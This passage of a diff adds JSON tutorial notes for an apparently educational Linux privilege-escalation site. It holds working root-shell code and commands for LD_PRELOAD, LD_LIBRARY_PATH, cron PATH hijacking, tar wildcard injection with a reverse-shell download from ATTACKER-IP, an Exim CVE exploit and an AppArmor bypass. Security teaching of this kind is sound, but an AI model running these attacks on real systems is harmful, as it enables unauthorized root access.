+        "text": "This command compiles a malicious C program into a <highlight>shared object (.so)</highlight>. The flags <highlight>-fPIC</highlight> and <highlight>-shared</highlight> create position-independent code suitable for shared libraries, while <highlight>-nostartfiles</highlight> prevents standard startup routines from being included."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-example-code",
+        "text": "Example Malicious Library Code"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-preload-code",
+        "language": "c",
+        "code": "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-code-analysis",
+        "text": "The <highlight>_init()</highlight> function runs automatically when the shared library is loaded by the dynamic loader. The function sets the process UID and GID to <highlight>0 (root)</highlight> and then spawns a <highlight>bash shell</highlight>, resulting in a root shell if the program runs with sudo privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-exploit",
+        "text": "Executing the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-preload-run-command",
+        "language": "bash",
+        "code": "sudo LD_PRELOAD=/tmp/preload.so /usr/bin/vim"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-preload-root-shell",
+        "language": "text",
+        "code": "root@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-exploit-analysis",
+        "text": "When the command runs, the dynamic loader loads <highlight>/tmp/preload.so</highlight> before other libraries because of the <highlight>LD_PRELOAD</highlight> variable. Since the program is executed with <highlight>sudo</highlight>, the malicious library runs with <highlight>root privileges</highlight> and spawns a root shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-execution-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "ld-preload-flow",
+        "title": "Attack Steps",
+        "items": [
+          "Run sudo -l to check if LD_PRELOAD is preserved",
+          "Create a malicious shared library with root shell code",
+          "Compile the shared library using gcc",
+          "Run a permitted sudo command while setting LD_PRELOAD",
+          "The dynamic loader loads the malicious library first",
+          "The _init() function executes automatically",
+          "A root shell is spawned"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-importance",
+        "text": "Why This Misconfiguration is Dangerous"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-importance-analysis",
+        "text": "Allowing <highlight>LD_PRELOAD</highlight> in sudo environment variables is extremely dangerous because it allows arbitrary code execution before a program starts. If a user can run any command with sudo while controlling <highlight>LD_PRELOAD</highlight>, they can load a malicious library and gain <highlight>root privileges</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 23,
+    "slug": "ld-library-path",
+    "title": "LD_Library_PATH",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/sudo/ld_library_path.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-intro",
+        "text": "Privilege Escalation via LD_LIBRARY_PATH"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-definition",
+        "text": "<highlight>LD_LIBRARY_PATH</highlight> is an environment variable used by the Linux dynamic loader to define additional directories where shared libraries should be searched before the system default locations. If this variable is preserved in <highlight>sudo</highlight> configurations, a user can force a program to load a malicious shared library from a custom directory, potentially resulting in <highlight>root privilege escalation</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-check",
+        "text": "Check if LD_LIBRARY_PATH is Allowed"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-library-path-check-command",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-library-path-check-output",
+        "language": "text",
+        "code": "Matching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_LIBRARY_PATH\n\nUser user may run the following commands on this host:\n    (root) NOPASSWD: /usr/sbin/apache2"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-check-analysis",
+        "text": "If the sudo configuration contains <highlight>env_keep+=LD_LIBRARY_PATH</highlight>, the environment variable will not be removed when running commands with sudo. This allows a user to control where the dynamic loader searches for shared libraries."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-find-libraries",
+        "text": "Identify Libraries Used by the Target Program"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-library-path-ldd-command",
+        "language": "bash",
+        "code": "ldd /usr/sbin/apache2"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-library-path-ldd-output",
+        "language": "text",
+        "code": "libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3\nlibaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0\nlibapr-1.so.0 => /usr/lib/libapr-1.so.0\nlibcrypt.so.1 => /lib/libcrypt.so.1\nlibc.so.6 => /lib/libc.so.6"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-ldd-analysis",
+        "text": "The <highlight>ldd</highlight> command lists the shared libraries required by a program. These libraries are normally loaded from system directories, but the search order can be changed using <highlight>LD_LIBRARY_PATH</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-create-library",
+        "text": "Creating a Malicious Shared Library"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-library-path-compile-command",
+        "language": "bash",
+        "code": "gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-compile-analysis",
+        "text": "This command compiles a malicious C program into a shared library named <highlight>libcrypt.so.1</highlight>. The name is chosen because it matches a legitimate library used by the target program, allowing it to be replaced during the loading process."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-example-code",
+        "text": "Example Malicious Library Code"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-library-path-code",
+        "language": "c",
+        "code": "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    setgid(0);\n    setuid(0);\n    system(\"/bin/bash\");\n}"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-code-analysis",
+        "text": "The <highlight>_init()</highlight> function executes automatically when the library is loaded. It changes the process UID and GID to <highlight>root (0)</highlight> and spawns a <highlight>bash shell</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-exploit",
+        "text": "Executing the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-library-path-run-command",
+        "language": "bash",
+        "code": "sudo LD_LIBRARY_PATH=/tmp apache2"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-library-path-root-shell",
+        "language": "text",
+        "code": "root@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-exploit-analysis",
+        "text": "When the program starts, the dynamic loader searches for required libraries. Because <highlight>LD_LIBRARY_PATH</highlight> is set to <highlight>/tmp</highlight>, the loader finds the malicious <highlight>libcrypt.so.1</highlight> first and loads it instead of the legitimate system library. Since the program runs with <highlight>sudo privileges</highlight>, the malicious code executes with <highlight>root privileges</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-execution-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "ld-library-path-flow",
+        "title": "Attack Steps",
+        "items": [
+          "Run sudo -l to check if LD_LIBRARY_PATH is preserved",
+          "Use ldd to identify libraries used by a sudo executable",
+          "Create a malicious shared library with the same name as a legitimate dependency",
+          "Compile the malicious library using gcc",
+          "Place the library in a writable directory such as /tmp",
+          "Run the sudo command while setting LD_LIBRARY_PATH to that directory",
+          "The loader loads the malicious library first",
+          "The malicious code executes and spawns a root shell"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-library-path-importance",
+        "text": "Why This Misconfiguration is Dangerous"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-library-path-importance-analysis",
+        "text": "Allowing <highlight>LD_LIBRARY_PATH</highlight> to persist in sudo environments is dangerous because it allows attackers to manipulate the library search order. By placing a malicious library in a controlled directory, attackers can hijack the loading process and execute arbitrary code with <highlight>root privileges</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 22,
+    "slug": "ld-preload-script",
+    "title": "LD_PRELOAD",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/SUDO/ld_preload.c",
+    "language": "c",
+    "explanationFile": "/Explantion/SUDO/ld_preload.json"
+  },
+  {
+    "id": 23,
+    "slug": "ld_library_path_script",
+    "title": "LD_LIBRARY_PATH",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/SUDO/ld_library_path.c",
+    "language": "c",
+    "explanationFile": "/Explantion/SUDO/ld_library_path.json"
+  },
+  {
+    "id": 27,
+    "slug": "cve-2016-1531",
+    "title": "CVE-2016-1531",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/CVE/cve-2016-1531.sh",
+    "language": "sh",
+    "explanationFile": "/Explantion/CVE/cve-2016-1531.json"
+  },
+  {
+    "id": 24,
+    "slug": "basic-cronjob",
+    "title": "Basic Cronjob",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/cronjob/basic-cronjob.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-intro",
+        "text": "Privilege Escalation via Cron PATH Hijacking"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-definition",
+        "text": "<highlight>Cron</highlight> is a Linux service used to automatically execute commands or scripts at scheduled intervals. If a cron job runs a command without specifying its full path and the <highlight>PATH variable</highlight> includes a directory that is writable by a normal user, an attacker can place a malicious script with the same name in that directory. When the cron job executes as <highlight>root</highlight>, it may run the attacker-controlled script, resulting in <highlight>root privilege escalation</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-check-crontab",
+        "text": "Checking the System-Wide Crontab"
+      },
+      {
+        "type": "code_block",
+        "id": "cron-path-hijacking-crontab-command",
+        "language": "bash",
+        "code": "cat /etc/crontab"
+      },
+      {
+        "type": "output_block",
+        "id": "cron-path-hijacking-crontab-output",
+        "language": "text",
+        "code": "SHELL=/bin/sh\nPATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root overwrite.sh\n* * * * * root /usr/local/bin/compress.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-crontab-analysis",
+        "text": "The cron job runs <highlight>overwrite.sh</highlight> every minute as <highlight>root</highlight>. Because the command does not include a full path, the system will search for the script using the <highlight>PATH variable</highlight>. Since <highlight>/home/user</highlight> appears first and is writable by the user, it becomes possible to place a malicious script there."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-create-script",
+        "text": "Creating a Malicious Script"
+      },
+      {
+        "type": "code_block",
+        "id": "cron-path-hijacking-create-command",
+        "language": "bash",
+        "code": "nano /home/user/overwrite.sh"
+      },
+      {
+        "type": "output_block",
+        "id": "cron-path-hijacking-script-content",
+        "language": "bash",
+        "code": "#!/bin/bash\n\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-script-analysis",
+        "text": "The script copies the <highlight>/bin/bash</highlight> binary into the <highlight>/tmp</highlight> directory and sets the <highlight>SUID bit</highlight>. This allows the binary to execute with the privileges of its owner. If the script runs as root, the copied bash binary will also be owned by root."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-make-executable",
+        "text": "Making the Script Executable"
+      },
+      {
+        "type": "code_block",
+        "id": "cron-path-hijacking-chmod-command",
+        "language": "bash",
+        "code": "chmod +x /home/user/overwrite.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-chmod-analysis",
+        "text": "The script must have executable permissions so that the cron service can run it. Without the executable bit, cron will not be able to execute the script."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-wait-cron",
+        "text": "Waiting for the Cron Job to Execute"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-wait-analysis",
+        "text": "Because the cron job runs every minute, the system will eventually execute <highlight>overwrite.sh</highlight> as <highlight>root</highlight>. When this happens, the script creates a new SUID bash binary at <highlight>/tmp/rootbash</highlight> owned by root."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-root-shell",
+        "text": "Spawning a Root Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "cron-path-hijacking-root-command",
+        "language": "bash",
+        "code": "/tmp/rootbash -p"
+      },
+      {
+        "type": "output_block",
+        "id": "cron-path-hijacking-root-output",
+        "language": "text",
+        "code": "rootbash-4.1#"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-root-analysis",
+        "text": "The <highlight>-p</highlight> flag tells bash to preserve privileges. Because the binary has the <highlight>SUID bit</highlight> set and is owned by <highlight>root</highlight>, executing it gives the user a shell running with <highlight>root privileges</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-execution-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "cron-path-hijacking-flow",
+        "title": "Attack Steps",
+        "items": [
+          "View the system-wide crontab using cat /etc/crontab",
+          "Identify cron jobs that run commands without full paths",
+          "Check if the PATH variable contains a writable directory such as /home/user",
+          "Create a malicious script with the same name as the command used in the cron job",
+          "Place the script in the writable directory included in PATH",
+          "Make the script executable",
+          "Wait for the cron job to run as root",
+          "The malicious script executes and creates a SUID root shell",
+          "Run the SUID bash binary to gain a root shell"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "cron-path-hijacking-importance",
+        "text": "Why This Misconfiguration is Dangerous"
+      },
+      {
+        "type": "order_block",
+        "id": "cron-path-hijacking-importance-analysis",
+        "text": "Running cron jobs without specifying the full path to executables is dangerous when the <highlight>PATH variable</highlight> includes directories writable by normal users. Attackers can place malicious scripts in those directories and hijack the command execution flow, causing the cron job to execute attacker-controlled code with <highlight>root privileges</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 25,
+    "slug": "wildcard-cronjob",
+    "title": "WildCard Cronjob",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/cronjob/wildcard-cronjob.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-injection-intro",
+        "text": "Privilege Escalation via Tar Wildcard Injection"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-injection-definition",
+        "text": "<highlight>Wildcard Injection</highlight> occurs when a script runs a command using the <highlight>* wildcard</highlight> to process files in a directory. The shell expands the wildcard into all filenames before the command executes. If an attacker can create specially crafted filenames that look like <highlight>command line options</highlight>, the target program may interpret them as options instead of filenames. When such a script runs as <highlight>root</highlight>, this can allow an attacker to execute arbitrary commands and gain <highlight>root privileges</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-check-cron-script",
+        "text": "Inspecting the Cron Script Using Tar"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-view-script-command",
+        "language": "bash",
+        "code": "cat /usr/local/bin/compress.sh"
+      },
+      {
+        "type": "output_block",
+        "id": "tar-wildcard-view-script-output",
+        "language": "bash",
+        "code": "#!/bin/bash\ncd /home/user\ntar czf /tmp/backup.tar.gz *"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-script-analysis",
+        "text": "The script changes directory to <highlight>/home/user</highlight> and then runs the <highlight>tar</highlight> command with the wildcard <highlight>*</highlight>. The wildcard expands to every filename in the directory. If an attacker can create files whose names resemble <highlight>tar command options</highlight>, the tar program may interpret them as options rather than filenames."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-generate-payload",
+        "text": "Generating a Reverse Shell Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-msfvenom-command",
+        "language": "bash",
+        "code": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-msfvenom-analysis",
+        "text": "The <highlight>msfvenom</highlight> tool generates a Linux executable binary that creates a <highlight>reverse shell</highlight>. When executed, this program connects back to the attacker machine at the specified <highlight>LHOST</highlight> and <highlight>LPORT</highlight>, giving remote shell access."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-transfer-payload",
+        "text": "Transferring the Payload to the Target System"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-wget-command",
+        "language": "bash",
+        "code": "wget http://ATTACKER-IP:8000/shell.elf"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-chmod-command",
+        "language": "bash",
+        "code": "chmod +x /home/user/shell.elf"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-transfer-analysis",
+        "text": "The malicious payload must be placed in <highlight>/home/user</highlight> because the cron script executes the tar command inside this directory. Making the file executable ensures it can be executed by the system when triggered."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-create-malicious-files",
+        "text": "Creating Malicious Filenames for Tar Options"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-create-files-command",
+        "language": "bash",
+        "code": "touch /home/user/--checkpoint=1\ntouch /home/user/--checkpoint-action=exec=shell.elf"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-files-analysis",
+        "text": "These filenames are crafted to look like <highlight>tar command options</highlight>. When the wildcard expands, tar will interpret <highlight>--checkpoint=1</highlight> and <highlight>--checkpoint-action=exec=shell.elf</highlight> as options instead of filenames. The checkpoint feature allows tar to execute a command at specific intervals, which is abused here to run the malicious binary."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-listener",
+        "text": "Starting a Netcat Listener"
+      },
+      {
+        "type": "code_block",
+        "id": "tar-wildcard-netcat-command",
+        "language": "bash",
+        "code": "nc -nvlp 4444"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-netcat-analysis",
+        "text": "The attacker starts a <highlight>netcat listener</highlight> on the specified port. When the payload executes, it connects back to this listener and provides an interactive shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-execution",
+        "text": "Cron Job Execution and Exploit Trigger"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-execution-analysis",
+        "text": "When the cron job runs, the wildcard <highlight>*</highlight> expands to include all files in <highlight>/home/user</highlight>, including the malicious filenames. The command effectively becomes something like: <highlight>tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=shell.elf ...</highlight>. Tar interprets these entries as options and executes <highlight>shell.elf</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-root-shell",
+        "text": "Receiving the Root Shell"
+      },
+      {
+        "type": "output_block",
+        "id": "tar-wildcard-root-output",
+        "language": "text",
+        "code": "connect to [ATTACKER-IP] from victim\nroot@debian:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-root-analysis",
+        "text": "Because the cron job runs as <highlight>root</highlight>, the executed payload also runs with root privileges. The reverse shell connects back to the attacker's listener, providing a fully interactive <highlight>root shell</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-execution-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "tar-wildcard-flow",
+        "title": "Attack Steps",
+        "items": [
+          "Inspect the cron script that uses the tar command with a wildcard",
+          "Generate a reverse shell payload using msfvenom",
+          "Transfer the payload to the target system",
+          "Make the payload executable",
+          "Create filenames that mimic tar command line options",
+          "Start a netcat listener on the attacker machine",
+          "Wait for the cron job to execute the tar command",
+          "Wildcard expansion injects malicious options into tar",
+          "Tar executes the attacker-controlled payload",
+          "A root reverse shell connects back to the attacker"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "tar-wildcard-importance",
+        "text": "Why Wildcard Injection is Dangerous"
+      },
+      {
+        "type": "order_block",
+        "id": "tar-wildcard-importance-analysis",
+        "text": "Using wildcards in scripts that run with elevated privileges can introduce serious security risks. If attackers can control filenames in the directory being processed, they may inject command-line options into the executed program. When the program supports features that allow command execution, such as the <highlight>tar checkpoint feature</highlight>, it becomes possible to execute arbitrary code with <highlight>root privileges</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 26,
+    "slug": "known-exploit",
+    "title": "Known Exploit",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/SUID-SGID/known-exploit.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "suid-exim-intro",
+        "text": "Privilege Escalation via SUID Exim (CVE-2016-1531)"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-definition",
+        "text": "<highlight>SUID (Set User ID)</highlight> is a special Linux file permission that allows a program to run with the privileges of the file owner instead of the user executing it. If a binary owned by <highlight>root</highlight> has the SUID bit set, it will run with <highlight>root privileges</highlight>. If such a binary contains a vulnerability, it may allow a normal user to perform <highlight>local privilege escalation</highlight> and gain root access."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-find-binaries",
+        "text": "Finding SUID and SGID Binaries"
+      },
+      {
+        "type": "code_block",
+        "id": "suid-exim-find-command",
+        "language": "bash",
+        "code": "find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-find-analysis",
+        "text": "This command searches the entire filesystem for files with the <highlight>SUID</highlight> or <highlight>SGID</highlight> permission bits set. The <highlight>-perm -u+s</highlight> flag identifies SUID files, while <highlight>-perm -g+s</highlight> identifies SGID files. The <highlight>ls -l</highlight> command is executed for each match to display detailed file permissions. Errors such as permission denials are suppressed by redirecting them to <highlight>/dev/null</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-identify-target",
+        "text": "Identifying a Vulnerable Binary"
+      },
+      {
+        "type": "output_block",
+        "id": "suid-exim-find-output",
+        "language": "text",
+        "code": "-rwsr-xr-x 1 root root 963691 May 13 2017 /usr/sbin/exim-4.84-3"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-target-analysis",
+        "text": "The output shows that <highlight>/usr/sbin/exim-4.84-3</highlight> has the <highlight>SUID bit</highlight> set and is owned by <highlight>root</highlight>. This means the program runs with root privileges when executed. Because this version of <highlight>Exim</highlight> is known to be vulnerable, it becomes a potential target for privilege escalation."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-search-exploit",
+        "text": "Searching for a Known Exploit"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-exploit-search",
+        "text": "After identifying a SUID binary, the next step is to search for known vulnerabilities associated with that software version. Public exploit repositories such as Exploit-DB, GitHub, or security advisories may contain proof-of-concept exploits. The vulnerable version of Exim has a known local privilege escalation vulnerability identified as <highlight>CVE-2016-1531</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-locate-exploit",
+        "text": "Locating the Exploit Script on the System"
+      },
+      {
+        "type": "code_block",
+        "id": "suid-exim-exploit-path",
+        "language": "bash",
+        "code": "cd ~/tools/suid/exim\nls"
+      },
+      {
+        "type": "output_block",
+        "id": "suid-exim-exploit-output",
+        "language": "text",
+        "code": "cve-2016-1531.sh"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-exploit-analysis",
+        "text": "The exploit script <highlight>cve-2016-1531.sh</highlight> targets the vulnerable Exim version installed on the system. This script abuses the Perl startup functionality within Exim to load a malicious module and execute commands as root."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-run-exploit",
+        "text": "Executing the Exploit"
+      },
+      {
+        "type": "code_block",
+        "id": "suid-exim-run-command",
+        "language": "bash",
+        "code": "./cve-2016-1531.sh"
+      },
+      {
+        "type": "output_block",
+        "id": "suid-exim-root-output",
+        "language": "text",
+        "code": "[ CVE-2016-1531 local root exploit\nsh-4.1# whoami\nroot"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-run-analysis",
+        "text": "When the exploit runs, it creates a malicious Perl module and forces Exim to load it using specially crafted environment variables. Because the Exim binary runs with <highlight>root privileges</highlight>, the malicious module executes a shell command that spawns a <highlight>root shell</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-exploit-mechanism",
+        "text": "Understanding the Exploit Mechanism"
+      },
+      {
+        "type": "code_block",
+        "id": "suid-exim-perl-module",
+        "language": "perl",
+        "code": "package root;\nuse strict;\nuse warnings;\n\nsystem(\"/bin/sh\");"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-perl-analysis",
+        "text": "The exploit writes a malicious Perl module that executes <highlight>/bin/sh</highlight>. Environment variables such as <highlight>PERL5LIB</highlight> and <highlight>PERL5OPT</highlight> are then used to force Exim to load this module when it starts. Since Exim runs with root privileges due to the <highlight>SUID bit</highlight>, the shell spawned by the module runs as <highlight>root</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-execution-flow",
+        "text": "Execution Flow of the Attack"
+      },
+      {
+        "type": "explanation",
+        "id": "suid-exim-flow",
+        "title": "Attack Steps",
+        "items": [
+          "Search the system for SUID and SGID binaries using the find command",
+          "Identify binaries owned by root that may be vulnerable",
+          "Discover that the Exim binary has the SUID bit set",
+          "Research the installed version and find the CVE-2016-1531 vulnerability",
+          "Locate or obtain a compatible exploit script",
+          "Execute the exploit script as a normal user",
+          "The script creates a malicious Perl module",
+          "Exim loads the module due to manipulated environment variables",
+          "The module executes /bin/sh with root privileges",
+          "A root shell is obtained"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "suid-exim-importance",
+        "text": "Why SUID Vulnerabilities are Dangerous"
+      },
+      {
+        "type": "order_block",
+        "id": "suid-exim-importance-analysis",
+        "text": "SUID binaries run with elevated privileges and are commonly owned by root. If a vulnerable program with the <highlight>SUID bit</highlight> is accessible to normal users, it can be abused to execute arbitrary commands with <highlight>root privileges</highlight>. This makes poorly secured or outdated SUID binaries one of the most common causes of <highlight>local privilege escalation</highlight> on Linux systems."
+      }
+    ]
+  },
+  {
+    "id": 27,
+    "slug": "apparmor",
+    "title": "App-Armor",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/Apparmor/apparmor.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "apparmor-bypass-intro",
+        "text": "Privilege Escalation via AppArmor Bypass and Writable Script Execution"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-bypass-definition",
+        "text": "<highlight>AppArmor</highlight> is a Linux security module that restricts what programs can do using <highlight>path‑based access control</highlight>. It limits which files a program can read, write, or execute. If a shell is running under an AppArmor profile, certain directories or actions may be blocked even if normal Linux permissions allow them."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-identify-shell",
+        "text": "Identifying the User Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-passwd-check",
+        "language": "bash",
+        "code": "grep think /etc/passwd"
+      },
+      {
+        "type": "output_block",
+        "id": "apparmor-passwd-output",
+        "language": "text",
+        "code": "think:x:1000:1000:,,,:/home/think:/usr/sbin/ash"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-shell-analysis",
+        "text": "The output shows that the user <highlight>think</highlight> is using <highlight>/usr/sbin/ash</highlight> as their login shell. This is unusual because most Linux systems use <highlight>/bin/bash</highlight> or <highlight>/bin/sh</highlight>. Seeing <highlight>ash</highlight> suggests the shell might be restricted or controlled by a security mechanism such as <highlight>AppArmor</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-detect",
+        "text": "Checking for an AppArmor Profile"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-check-command",
+        "language": "bash",
+        "code": "cat /etc/apparmor.d/usr.sbin.ash"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-detect-analysis",
+        "text": "The file <highlight>/etc/apparmor.d/usr.sbin.ash</highlight> confirms that the shell <highlight>ash</highlight> is controlled by an AppArmor profile. AppArmor profiles define what paths the program can access and which actions are allowed or denied."
+      },
+      {
+        "type": "output_block",
+        "id": "apparmor-deny-rules",
+        "language": "text",
+        "code": "deny /tmp/** w,\ndeny /home/** w,\ndeny /opt/** w,\ndeny /dev/shm/** w,"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-deny-analysis",
+        "text": "These rules show that the restricted shell cannot write to directories such as <highlight>/tmp</highlight>, <highlight>/home</highlight>, <highlight>/opt</highlight>, or <highlight>/dev/shm</highlight>. Even if normal Linux permissions allow writing, AppArmor will block the action for processes running under the <highlight>ash</highlight> profile."
+      },
+      {
+        "type": "section_heading",
+        "id": "apparmor-bypass-method",
+        "text": "Bypassing AppArmor via Path‑Based Execution"
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-copy-bash",
+        "language": "bash",
+        "code": "cp /usr/bin/bash /dev/shm"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-copy-analysis",
+        "text": "The binary <highlight>/usr/bin/bash</highlight> was copied into <highlight>/dev/shm</highlight>. AppArmor restrictions apply based on the <highlight>path of the executable</highlight>. The profile only restricts <highlight>/usr/sbin/ash</highlight>, not the bash binary."
+      },
+      {
+        "type": "code_block",
+        "id": "apparmor-run-new-shell",
+        "language": "bash",
+        "code": "/dev/shm/bash"
+      },
+      {
+        "type": "order_block",
+        "id": "apparmor-shell-analysis-2",
+        "text": "Executing <highlight>/dev/shm/bash</highlight> launches a new shell that is not governed by the AppArmor profile applied to <highlight>ash</highlight>. This effectively bypasses the restrictions imposed on the original shell."
+      },
+      {
